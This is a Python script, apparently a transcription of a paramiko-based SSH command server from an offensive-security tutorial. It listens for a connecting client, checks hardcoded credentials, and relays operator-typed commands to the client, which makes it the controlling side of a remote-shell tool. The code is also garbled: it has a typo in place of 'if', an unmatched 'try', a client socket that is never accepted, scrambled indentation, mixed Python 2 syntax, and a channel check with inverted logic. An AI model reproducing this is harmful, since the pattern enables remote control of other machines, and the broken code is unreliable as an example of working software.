import socket 
import paramiko 
import threading 
import sys 

#using key from Paramiko demo files 
host_key = paramiko.RSAKey(filename='test_rsa.key')

class Server (paramiko.ServerInterface):
	def __init__(self):
		self.event = threading.Event()
	def check_channelrequest(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED 
	def check_auth_password(self, username, password):
		if (username == 'Patrick') and (password == 'shredspythonson'):
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED
	server = sys.argv[1]
	ssh_port = int(sys.argv[2])
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind((server, ssh_port))
		sock.listen(100)
		print('[+] Got a connection!')

	try:
		bhSession = paramiko.Transport(client)
		bhSession.add_server_key(host_key)
		server = Server()
		try:
			bhSession.start_server(server=server) 
		except paramiko.SSHException, x:
			print('[-] SSH negotiation failed.')
			chan = bhSession.accept(20) 
			print(' [+] Authenticated!')
			print(chan.recv(1024))
			chan.send('Welcome to bh_ssh')
			while True:
				try:
					command = raw_input("Enter command: ").strip('/n/')
					id command != 'exit':
					chan.send(command)
					print(chan.recv(1024) + '\n')
				else:
					chan.send('exit')
					print('exiting')
					bhSession.close() 
					raise exception ('exit')
				except KeyboardInterrupt:
					bhSession.close()
			except Exception:
				print ('[-] Caught exception: ' + str(e))
				try:
					bhSession.close()
				except:
					pass
				sys.exit(1)


